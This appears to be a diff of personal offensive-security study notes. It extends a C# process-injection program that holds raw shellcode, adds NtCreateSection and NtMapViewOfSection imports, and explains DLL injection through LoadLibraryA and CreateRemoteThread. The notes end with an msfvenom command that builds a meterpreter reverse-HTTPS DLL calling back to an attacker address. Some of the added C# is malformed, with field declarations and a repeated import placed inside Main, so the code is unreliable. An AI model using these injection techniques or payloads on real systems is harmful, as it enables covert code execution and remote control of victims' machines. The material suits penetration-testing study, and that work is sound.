@@ -452,6 +452,27 @@ namespace Inject
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
         static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int
        processId);
+        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
+        static extern UInt32 NtCreateSection(
+        ref IntPtr SectionHandle,
+        UInt32 DesiredAccess,
+        IntPtr ObjectAttributes,
+        ref UInt32 MaximumSize,
+        UInt32 SectionPageProtection,
+        UInt32 AllocationAttributes,
+        IntPtr FileHandle);
+        [DllImport("ntdll.dll", SetLastError = true)]
+        static extern uint NtMapViewOfSection(
+    IntPtr SectionHandle,
+    IntPtr ProcessHandle,
+    ref IntPtr BaseAddress,
+    UIntPtr ZeroBits,
+    UIntPtr CommitSize,
+    out ulong SectionOffset,
+    out uint ViewSize,
+    uint InheritDisposition,
+    uint AllocationType,
+    uint Win32Protect);
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
         static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint
        dwSize, uint flAllocationType, uint flProtect);
@@ -464,7 +485,31 @@ namespace Inject
        dwCreationFlags, IntPtr lpThreadId);
         static void Main(string[] args)
         {
-            IntPtr hProcess = OpenProcess(0x001F0FFF, false, 7676);
+
+         IntPtr SectionHandle = IntPtr.Zero;
+         uint MaximumSize = 2048;
+         private static uint SEC_COMMIT = 0x08000000;
+         private static uint SECTION_MAP_WRITE = 0x0002;
+         private static uint SECTION_MAP_READ = 0x0004;
+         private static uint SECTION_MAP_EXECUTE = 0x0008;
+         private static uint SECTION_ALL_ACCESS = SECTION_MAP_WRITE | SECTION_MAP_READ | SECTION_MAP_EXECUTE;
+         uint res = NtCreateSection(ref SectionHandle, SECTION_ALL_ACCESS, IntPtr.Zero, ref MaximumSize, EXECUTE_READ_WRITE, SEC_COMMIT, IntPtr.Zero);
+        // res = 0 indicates a successful creation of section
+
+        [DllImport("ntdll.dll", SetLastError = true)]
+        static extern uint NtMapViewOfSection(
+   IntPtr SectionHandle,
+   IntPtr ProcessHandle,
+   ref IntPtr BaseAddress,
+   UIntPtr ZeroBits,
+   UIntPtr CommitSize,
+   out ulong SectionOffset,
+   out uint ViewSize,
+   uint InheritDisposition,
+   uint AllocationType,
+   uint Win32Protect);
+
+        IntPtr hProcess = OpenProcess(0x001F0FFF, false, 7676);
             IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
             byte[] buf = new byte[319] {
                 0x48,0x31,0xc9,0x48,0x81,0xe9,0xdd,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,
@@ -497,6 +542,75 @@ namespace Inject
     }
 }
 
+
 ```
 
 need to make changes into nt function above.
+
+
+# DLL injection
+
+Sometimes we wantto inject an entire dll inside a code
+
+# DLL injection theory
+
+LoadlIbrary is how we need to run. Hoever we cant force a remote process to do it just like that
+so instead we will need to trick. The server.
+
+ Recall that when calling CreateRemoteThread, the fourth argument is the start address
+of the function run in the new thread and the fifth argument is the memory address of a buffer
+containing arguments for that function
+
+he idea is to resolve the address of LoadLibraryA inside the remote process and invoke it while
+supplying the name of the DLL we want to load. If the address of LoadLibraryA is given as the
+fourth argument to CreateRemoteThread, it will be invoked when we call CreateRemoteThread.
+
+In order to supply the name of the DLL to LoadLibraryA, we must allocate a buffer inside the
+remote process and copy the name and path of the DLL into it. The address of this buffer can
+then be given as the fifth argument to CreateRemoteThread, after which it will be used with
+LoadLibrary.
+
+but  the DLL must be written in C or
+C++ and must be unmanaged. The managed C#-based DLL we have been working with so far will
+not work because we can not load a managed DLL into an unmanaged process.
+
+DLLs normally contain APIs that are called after the DLL is loaded. In order to call these
+APIs, an application would first have to “resolve” their names to memory addresses through the
+use of GetProcAddress. Since GetProcAddress cannot resolve an API in a remote process, we
+must craft our malicious DLL in a non-standard way
+
+structure of a DLL
+
+```
+BOOL WINAPI DllMain(
+ _In_ HINSTANCE hinstDLL,
+ _In_ DWORD fdwReason,
+ _In_ LPVOID lpvReserved
+);
+```
+unmanaged code
+
+```
+BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
+{
+ switch (ul_reason_for_call)
+ {
+ case DLL_PROCESS_ATTACH:
+ case DLL_THREAD_ATTACH:
+ case DLL_THREAD_DETACH:
+ case DLL_PROCESS_DETACH:
+ break;
+ }
+ return TRUE;
+}
+```
+
+# DLL injection with C#
+
+lets try and generate a dll with msfvenom
+
+```
+kali@kali:~$ sudo msfvenom -p windows/x64/meterpreter/reverse_https
+LHOST=192.168.119.120 LPORT=443 -f dll -o /var/www/html/met.dll
+```
+
